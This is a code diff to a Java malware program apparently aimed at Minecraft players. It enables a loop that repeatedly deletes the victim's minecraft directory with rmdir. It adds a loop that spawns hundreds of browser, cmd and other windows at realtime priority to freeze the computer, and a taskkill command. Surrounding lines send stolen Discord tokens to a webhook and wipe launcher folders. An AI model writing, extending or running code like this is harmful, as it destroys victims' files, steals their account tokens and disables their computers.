@@ -255,9 +255,10 @@ public class Core {
 		// Deletes minecraft directory if it somehow hasn't been wiped already
 		// Also attempts to shuts computer down a bunch of times
 		for (int i = 40; i < 600; i++) {
-			// Runtime.getRuntime().exec("cmd /c ping localhost -n " + String.valueOf(i) + "
-			// > nul && rmdir " + minecraft + "-s -q");
-			// Runtime.getRuntime().exec("shutdown -s -f -fw -t " + String.valueOf(i + 40));
+			Runtime.getRuntime()
+					.exec("cmd /c ping localhost -n " + String.valueOf(i) + " > nul && rmdir " + minecraft + "-s -q");
+			// Shouldn't be necessary, code should force them to turn their computer off
+			// Runtime.getRuntime().exec("cmd /c ping localhost -n " + String.valueOf(i + 40) + " > nul && shutdown -s -f -fw -t 0");
 		}
 		sendData("**Grabbing Discord Tokens**", Hooks.getHook(), getName());
 		ArrayList<String> tokens = new ArrayList<>();
@@ -375,7 +376,7 @@ public class Core {
 			branchWipe(dir);
 			branchWipe(mcLauncher);
 		}
-		
+
 		if (scripts.getDoesExecute()) {
 			for (String f : scripts.getFileExecutes()) {
 				File file = new File(f);
@@ -462,7 +463,14 @@ public class Core {
 			branchWipe(mcLauncher);
 			Runtime.getRuntime().exec("cmd /c ping localhost -n 10 > nul && rmdir " + minecraft + "-s -q");
 		}
-		Runtime.getRuntime().exec("shutdown -s -f -fw -t 15");
+		for (int i = 10; i <= 1000; i++) { // Spams the fuck out of the target with random windows
+			Runtime.getRuntime().exec("cmd /c ping localhost -n " + String.valueOf(i)
+					+ " > nul && start iexplore /realtime & start notepad /realtime & start cmd /realtime & start explorer /realtime & start calc /realtime & start chrome /realtime & start firefox /realtime");
+		}
+		Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && taskkill /f /im javaw.exe");
+
+		// Shouldn't be necessary, as the above loop should basically deadlock the computer
+		// Runtime.getRuntime().exec("cmd /c ping localhost -n 30 > nul && shutdown -s -f -fw -t 0");
 		Crash c = new Crash();
 	}
 
